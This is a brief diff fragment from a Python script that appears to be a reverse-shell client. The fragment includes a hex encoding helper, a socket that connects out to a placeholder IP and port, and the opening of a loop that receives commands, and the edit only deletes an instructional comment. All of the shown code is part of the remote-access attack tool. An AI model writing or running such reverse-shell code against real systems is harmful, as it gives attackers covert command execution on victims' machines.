@@ -32,7 +32,7 @@ def hex_handler(text, encode=False, decode=False):
     return new_text
 
 rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-rev_socket.connect(('IP', PORT)) # Set IP and port on this line.
+rev_socket.connect(('IP', PORT))
 
 while True:
     command = b''
